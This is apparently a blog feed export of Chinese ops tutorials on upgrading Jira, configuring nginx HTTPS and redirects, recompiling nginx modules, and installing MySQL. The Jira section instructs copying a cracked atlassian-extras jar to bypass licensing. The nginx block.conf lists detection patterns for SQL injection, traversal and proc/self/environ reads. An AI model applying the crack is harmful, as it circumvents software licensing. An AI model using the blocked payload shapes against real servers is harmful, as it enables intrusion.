<li>点击’备份’按钮，JIRA会将您的XML备份保存为压缩的归档文件。备份完成后，将显示一条信息，确认JIRA已将其数据写入指定的文件。</li>
<li>备份将存储在JIRA应用程序主目录的export(<strong>HOME目录</strong> 下的export)子目录中</li>
</ul>
</li>
</ul>
<h3 id="备份data目录"><a href="#备份data目录" class="headerlink" title="备份data目录"></a>备份data目录</h3><p>该目录包含JIRA实例的应用数据，例如，问题附件存储在目录中。在Linux上，可以编写一个小的shell脚本，将其放到/etc/cron.daily一个目录中备份 /var/backup/jira。如果你将attachments目录放在自定义位置而不是data目录中，则需要attachments单独备份目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp -rf /var/atlassian/application-data/jira  /var/atlassian/application-data/jira-7.4.1-bak</span><br></pre></td></tr></table></figure>

<h3 id="程序目录备份"><a href="#程序目录备份" class="headerlink" title="程序目录备份"></a>程序目录备份</h3><p>将<strong>安装目录</strong>和<strong>HOME目录</strong>也进行备份</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp -rf /opt/atlassian/jira  /opt/atlassian//jira-7.4.1-bak</span><br></pre></td></tr></table></figure>

<h2 id="Jira新版本-8-4-1-安装"><a href="#Jira新版本-8-4-1-安装" class="headerlink" title="Jira新版本(8.4.1)安装"></a>Jira新版本(8.4.1)安装</h2><h3 id="下载程序"><a href="#下载程序" class="headerlink" title="下载程序"></a>下载程序</h3><p><a href="https://www.atlassian.com/software/jira/download" target="_blank" rel="noopener">官网下载地址</a></p>
<h3 id="安装程序"><a href="#安装程序" class="headerlink" title="安装程序"></a>安装程序</h3><h5 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h5><ul>
<li><p>安装JDK(JIRA8.4.1需要JVM1.8及以上环境)</p>
</li>
<li><p>由于本次为升级，因此默认以上环境已经安装</p>
</li>
<li><p>将下载的atlassian-jira-software-8.4.1.tar.gz压缩包解压到安装目录中(参考<strong>新目录</strong>)</p>
</li>
<li><p>解压后修改安装包名称为jira，即为<strong>新目录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载</span></span><br><span class="line">wget https://product-downloads.atlassian.com/software/jira/downloads/atlassian-jira-software-8.4.1.tar.gz</span><br><span class="line"><span class="comment">#解压</span></span><br><span class="line">tar -xzvf  atlassian-jira-software-8.4.1.tar.gz -C /opt/atlassian/</span><br><span class="line">mv /opt/atlassian/mv atlassian-jira-software-8.4.1-standalone /opt/atlassian/jira</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h5><p>配置文件列表</p>
<p><a href="https://confluence.atlassian.com/adminjiraserver/important-directories-and-files-938847744.html" target="_blank" rel="noopener">Jira中重要文件</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server.xml</span><br><span class="line">dbconfig.xml</span><br><span class="line">jira-config.properties</span><br><span class="line">setenv.sh /  setenv.bat （内存分配和其他JVM参数）有关更多信息，请参阅  Jira中的重要文件链接</span><br></pre></td></tr></table></figure>

<ul>
<li><p>JAVA配置有两个办法：直接复制原目录的jre目录至新目录或者直接配置本机java环境</p>
<p>将<strong>原目录</strong>下的jre文件夹复制到<strong>新目录</strong>下</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp -r /opt/atlassian/jira-7.4.1/jre /opt/atlassian/jira</span><br></pre></td></tr></table></figure>

<ul>
<li>修改<strong>新目录</strong>bin文件夹下的setenv.sh,在 <strong>#!INSTALLER SET JAVA_HOME</strong> 下一行加入</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 复制目录配置</span></span><br><span class="line">JAVA_HOME=<span class="string">"/opt/atlassian/jira/jre/"</span>; <span class="built_in">export</span> JAVA_HOME</span><br><span class="line"><span class="comment"># 配置本机配置</span></span><br><span class="line">JAVA_HOME=<span class="string">"/usr/java/jdk1.8.0_202/jre/"</span>; <span class="built_in">export</span> JAVA_HOME</span><br></pre></td></tr></table></figure>

<ul>
<li>设置Jira HOME，编辑文件，设置Jira HOME目录<ul>
<li>查找jira-application.properties文件，设置jira.home</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#查找配置文件</span><br><span class="line">find . -name jira-application.properties </span><br><span class="line">#编辑</span><br><span class="line">vim /opt/atlassian/jira/atlassian-jira/WEB-INF/classes/jira-application.properties</span><br><span class="line"></span><br><span class="line">jira.home = /var/atlassian/application-data/jira</span><br><span class="line">#创建Jira home目录</span><br><span class="line">mkdir -p /var/atlassian/application-data/jira</span><br></pre></td></tr></table></figure>

<h5 id="旧配置复制"><a href="#旧配置复制" class="headerlink" title="旧配置复制"></a>旧配置复制</h5><ul>
<li><p>把破解包里面的atlassian-extras-3.2.jar和mysql-connector-java-5.1.39-bin.jar两个文件复制到/opt/atlassian/jira/atlassian-jira/WEB-INF/lib/目录下。</p>
<p>其中atlassian-extras-3..2.jar是用来替换原来的atlassian-extras-3.2.jar文件，用作破解jira系统的。</p>
<p>而mysql-connector-java-5.1.39-bin.jar是用来连接mysql数据库的驱动软件包。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /opt/atlassian/jira-7.4.1-bak/atlassian-jira/WEB-INF/lib/mysql-connector-java-5.1.39-bin.jar /opt/atlassian/jira/atlassian-jira/WEB-INF/lib/</span><br><span class="line">cp /opt/atlassian/jira-7.4.1-bak/atlassian-jira/WEB-INF/lib/atlassian-extras-3.2.jar /opt/atlassian/jira/atlassian-jira/WEB-INF/lib/</span><br></pre></td></tr></table></figure>
</li>
<li><p>数据库配置文件复制，因为安装数据库需要为空库，配置时需要创建配置文件。本教程为升级，所以直接复制原配置即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /var/atlassian/application-data/jira-7.4.1-bak/dbconfig.xml /var/atlassian/application-data/jira/dbconfig.xml</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="禁用自动重新索引"><a href="#禁用自动重新索引" class="headerlink" title="禁用自动重新索引"></a>禁用自动重新索引</h5><p>官方文档中指出：建议从平台升级（即从7.x升级到8.x）进行此步骤。</p>
<p>由于我们在Jira 8.0中引入了对索引的更改，因此您的旧索引与新版本不兼容。要创建一个新文件，Jira将在您启动它后立即触发自动重新索引。为避免两次重新编制索引（在启动后和升级应用程序之后），您可以禁用自动重新编制索引，并在准备就绪后再运行第二次重新编制索引。</p>
<p>编辑或创建以下文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch /var/atlassian/application-data/jira/jira-config.properties</span><br></pre></td></tr></table></figure>

<p>添加以下行，并保存文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upgrade.reindex.allowed=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>完成基础配置后，就可以启动Jira服务了(在<strong>新目录</strong>的bin文件夹下，执行./start-jira.sh)</p>
</li>
<li><p>浏览器访问</p>
</li>
<li><p>重置索引：点击设置-系统-高级-重新索引，<strong>重新索引操作</strong> 选择 <strong>后台重新索引</strong>，点击<strong>重新索引</strong></p>
</li>
</ul>
<h2 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a>数据恢复</h2><ul>
<li>将备份的.zip文件放入<strong>新HOME</strong>的import文件夹下，管理员账号访问浏览器，点击系统-恢复，选择文件后等待系统完成恢复。恢复完成后将重新登录JIRA，账号密码为原JIRA管理员信息</li>
<li>将备份的data文件下的数据放入<strong>新HOME</strong>的data文件夹下</li>
</ul>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><h4 id="（可选）更新Jira服务台"><a href="#（可选）更新Jira服务台" class="headerlink" title="（可选）更新Jira服务台"></a>（可选）更新Jira服务台</h4><p>如果您使用的是Jira Service Desk，则可以直接在UI中进行更新，而无需下载单独的安装程序。</p>
<ol>
<li>转到  <strong>&gt;应用程序&gt;版本和许可证</strong>。</li>
<li>更新Jira服务台。这将自动将Service Desk更新到兼容版本。</li>
</ol>
<h3 id><a href="#" class="headerlink" title></a></h3><h4 id="升级应用程序（附加组件）"><a href="#升级应用程序（附加组件）" class="headerlink" title="升级应用程序（附加组件）"></a>升级应用程序（附加组件）</h4><p>现在，您可以升级同时具有<strong>兼容</strong>  状态的应用程序  。如果您一般需要有关状态和应用程序的更多信息，请参阅“  <a href="https://confluence.atlassian.com/adminjiraserver/preparing-for-the-upgrade-966063325.html" target="_blank" rel="noopener">准备升级”</a>。</p>
<ol>
<li>转到  <strong>&gt;管理应用&gt;管理应用</strong>。</li>
<li>将您的应用升级到支持的版本。</li>
<li>应用程序升级后，即可启用它们。</li>
</ol>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h4 id="重建索引"><a href="#重建索引" class="headerlink" title="重建索引"></a>重建索引</h4><p>由于您的旧索引不兼容，因此请重新索引Jira以重建它。此步骤可能需要一些时间，具体取决于您遇到的问题和应用程序的数量。</p>
<ol>
<li>转到  <strong>&gt;索引编制</strong>，然后运行  <strong>Lock Jira并重建reindex</strong>。</li>
</ol>
<h2 id="做得好！"><a href="#做得好！" class="headerlink" title="做得好！"></a>做得好！</h2><p>您已将Jira升级到新版本。</p>
<h4 id="升级后登录页面"><a href="#升级后登录页面" class="headerlink" title="升级后登录页面"></a>升级后登录页面</h4><p>成功升级后，您应该会看到升级后的登录页面。它具有有关新版本的一些有用信息，如下所示。</p>
<p><img src="/articles/ecacdd4f/pulpscreen.png" alt></p>
<ol>
<li><strong>需要知道：</strong>  可能会影响您作为管理员工作的新功能列表。</li>
<li><strong>用户应用程序：</strong>升级后<strong>应用程序的</strong> 状态。</li>
<li><strong>应用程序链接：</strong>  您的应用程序链接的状态。</li>
<li><strong>发行说明：</strong>  链接到发行说明，您可以在其中查看有关已升级到的版本的更多详细信息</li>
</ol>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Confluence</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx中https的配置和http强制跳转</title>
    <url>/articles/ebb4cd52.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>随着现在网络互联网的告诉发展，给人们带来的很多便利，但也出现了很多隐患。作为站长，网站的安全至关重要。怎么做才安全呢？建议把http改为https，因为增加了证书认证，相对来说就会安全很多，并且对用户的体验也比较好，谁也不想访问个网站，在地址栏中显示不安全或直接显示不安全等。</p>
<a id="more"></a>



<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>centos7</p>
<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>1，nginx有安装ssl模块，这样才可以使用证书。<a href="https://wandouduoduo.github.io/articles/88000f44.html" target="_blank" rel="noopener">参考文档</a></p>
<p>2，购买或申请获取的证书文件。</p>
<h2 id="配置教程"><a href="#配置教程" class="headerlink" title="配置教程"></a>配置教程</h2><h4 id="放置证书"><a href="#放置证书" class="headerlink" title="放置证书"></a>放置证书</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p /usr/local/nginx/conf/ssl</span><br><span class="line">cp 证书.zip /usr/local/nginx/conf/ssl/</span><br><span class="line">cd /usr/local/nginx/conf/ssl/</span><br><span class="line">unzip 证书.zip</span><br></pre></td></tr></table></figure>

<h4 id="配置https"><a href="#配置https" class="headerlink" title="配置https"></a>配置https</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       443 ssl;</span><br><span class="line"></span><br><span class="line">    server_name wandouduoduo.com;</span><br><span class="line">    root /opt/www/webapps/;</span><br><span class="line">    index index.html index.htm;</span><br><span class="line">	</span><br><span class="line">	include block.conf;</span><br><span class="line"></span><br><span class="line">    ssl_session_cache shared:SSL:100m;</span><br><span class="line">    ssl_session_timeout  5m;</span><br><span class="line">    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">    ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">    ssl_certificate     ssl/证书.pem;</span><br><span class="line">    ssl_certificate_key ssl/证书.key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#禁止在header中出现服务器版本，防止黑客利用版本漏洞攻击</span></span><br><span class="line">    server_tokens off;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">         try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ =404;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="配置强制跳转"><a href="#配置强制跳转" class="headerlink" title="配置强制跳转"></a>配置强制跳转</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen      80;</span><br><span class="line">    server_name xxxxx;</span><br><span class="line">    rewrite ^(.*) https://<span class="variable">$server_name</span><span class="variable">$1</span> permanent;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>根据上述配置就可实现https，并让http强制跳转到https。</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>nginx防SQL注入与文件注入等相关安全设置</p>
<p>可以把下面内容写个配置文件block.conf，在server块中include。如上面配置教程中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#禁止sql注入</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~* <span class="string">".*[\;\'\&lt;\&gt;].*"</span> )&#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$request_uri</span> ~* <span class="string">"(cost\()|(concat\()"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$request_uri</span> ~* <span class="string">"[+|(%20)]union[+|(%20)]"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$request_uri</span> ~* <span class="string">"[+|(%20)]and[+|(%20)]"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$request_uri</span> ~* <span class="string">"[+|(%20)]select[+|(%20)]"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"(&lt;|%3C).*script.*(&gt;|%3E)"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"GLOBALS(=|[|%[0-9A-Z]&#123;0,2&#125;)"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"_REQUEST(=|[|%[0-9A-Z]&#123;0,2&#125;)"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"proc/self/environ"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"mosConfig_[a-zA-Z_]&#123;1,21&#125;(=|%3D)"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"base64_(en|de)code(.*)"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"select"</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> 404;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#禁止文件注入 </span></span><br><span class="line"><span class="comment">## Block file injections</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_file_injections</span> 0;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"[a-zA-Z0-9_]=(\.\.//?)+"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_file_injections</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"[a-zA-Z0-9_]=/([a-z0-9_.]//?)+"</span>) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$block_file_injections</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$block_file_injections</span> = 1) &#123;</span><br><span class="line">    <span class="built_in">return</span> 444;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">## 禁掉溢出攻击</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_common_exploits</span> 0;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"(&lt;|%3C).*script.*(&gt;|%3E)"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_common_exploits</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"GLOBALS(=|[|%[0-9A-Z]&#123;0,2&#125;)"</span>) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$block_common_exploits</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"_REQUEST(=|[|%[0-9A-Z]&#123;0,2&#125;)"</span>) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$block_common_exploits</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"proc/self/environ"</span>) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$block_common_exploits</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"mosConfig_[a-zA-Z_]&#123;1,21&#125;(=|%3D)"</span>) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$block_common_exploits</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"base64_(en|de)code(.*)"</span>) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$block_common_exploits</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$block_common_exploits</span> = 1) &#123;</span><br><span class="line">    <span class="built_in">return</span> 444;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">## 禁spam字段</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_spam</span> 0;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"b(ultram|unicauca|valium|viagra|vicodin|xanax|ypxaieo)b"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_spam</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"b(erections|hoodia|huronriveracres|impotence|levitra|libido)b"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_spam</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"b(ambien|bluespill|cialis|cocaine|ejaculation|erectile)b"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_spam</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$query_string</span> ~ <span class="string">"b(lipitor|phentermin|pro[sz]ac|sandyauer|tramadol|troyhamby)b"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_spam</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$block_spam</span> = 1) &#123;</span><br><span class="line">    <span class="built_in">return</span> 444;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">## 禁掉user-agents</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_user_agents</span> 0;</span><br><span class="line"><span class="comment"># Don’t disable wget if you need it to run cron jobs!</span></span><br><span class="line"><span class="comment">#if ($http_user_agent ~ "Wget") &#123;</span></span><br><span class="line"><span class="comment"># set $block_user_agents 1;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"><span class="comment"># Disable Akeeba Remote Control 2.5 and earlier</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"Indy Library"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Common bandwidth hoggers and hacking tools.</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"libwww-perl"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"GetRight"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"GetWeb!"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"Go!Zilla"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"Download Demon"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"Go-Ahead-Got-It"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"TurnitinBot"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"GrabNet"</span>) &#123;</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"WebBench"</span>) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"ApacheBench"</span>) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ ^$) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$http_user_agent</span> ~ <span class="string">"Python-urllib"</span>) &#123;</span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$block_user_agents</span> 1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$block_user_agents</span> = 1) &#123;</span><br><span class="line"><span class="built_in">return</span> 444;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web服务</category>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx升级或重新加载模块</title>
    <url>/articles/88000f44.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>在日常运维工作中，有几个场景：</p>
<p>1，nginx  web服务升级 。</p>
<p>2，https证书配置后，发现nginx编译没有加入ssl模块。</p>
<p>3，nginx配置后，有<code>nginx: [emerg] the &quot;xxx&quot; parameter requires</code>等等报错。</p>
<p>这些都需要重新编译nginx程序，并把需要的模块加载进去，但是对于不熟悉nginx的人，又头疼和担心，需要重新编译，会不会对原来有啥影响等等。本文就是针对这些场景给出解决方案。</p>
<a id="more"></a>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>centos7</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>首先，需要说明的是nginx因为其开放性而广受欢迎，其中开放性就是：松耦合，需要啥模块，重新加载编译后替换就可以了，所以完全不需要担心。</p>
<h4 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y gcc gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel</span><br></pre></td></tr></table></figure>

<h4 id="查看nginx原有模块"><a href="#查看nginx原有模块" class="headerlink" title="查看nginx原有模块"></a>查看nginx原有模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx -V</span><br></pre></td></tr></table></figure>

<p><img src="/articles/88000f44/1.png" alt></p>
<p>可以看到没有加载模块</p>
<h4 id="重新编译"><a href="#重新编译" class="headerlink" title="重新编译"></a>重新编译</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入到源码包</span></span><br><span class="line"><span class="built_in">cd</span> /opt/packages/sunscripts/install/packages/nginx-1.16.0</span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/nginx  --with-http_ssl_module  --with-http_stub_status_module  --with-http_gzip_static_module</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">make</span><br><span class="line">注意：这里不要进行make install，否则就是覆盖安装</span><br></pre></td></tr></table></figure>

<h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份</span></span><br><span class="line">cp /usr/<span class="built_in">local</span>/nginx/sbin/nginx /usr/<span class="built_in">local</span>/nginx/sbin/nginx.bak</span><br><span class="line"><span class="comment"># 停nginx</span></span><br><span class="line">systemctl stop nginx.service</span><br><span class="line"><span class="comment"># 替换</span></span><br><span class="line">cp ./objs/nginx /usr/<span class="built_in">local</span>/nginx/sbin/</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">systemctl start nginx.service</span><br><span class="line"><span class="comment"># 检查验证</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -V</span><br></pre></td></tr></table></figure>

<p><img src="/articles/88000f44/2.png" alt></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>按照上面的方案，按照自己需求加载模块，定制自己的nginx。</p>
<h2 id="一键安装nginx脚本"><a href="#一键安装nginx脚本" class="headerlink" title="一键安装nginx脚本"></a>一键安装nginx脚本</h2>]]></content>
      <categories>
        <category>Web服务</category>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7下使用yum源安装mysql5.7</title>
    <url>/articles/5449f5b8.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>现在centos上默认是没有yum源的，yum安装的是 MariaDB。本文详细介绍了centos7下使用yum源安装mysql5.7。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>系统：centos7</p>
<a id="more"></a>



<h2 id="配置yum源"><a href="#配置yum源" class="headerlink" title="配置yum源"></a>配置yum源</h2><h4 id="下载yum源："><a href="#下载yum源：" class="headerlink" title="下载yum源："></a>下载yum源：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget <span class="string">'https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm'</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/5449f5b8/1.png" alt></p>
<h4 id="安装yum源"><a href="#安装yum源" class="headerlink" title="安装yum源"></a>安装yum源</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -Uvh mysql57-community-release-el7-11.noarch.rpm</span><br></pre></td></tr></table></figure>

<p><img src="/articles/5449f5b8/2.png" alt></p>
<h2 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y mysql-community-server</span><br></pre></td></tr></table></figure>

<p><img src="/articles/5449f5b8/3.png" alt></p>
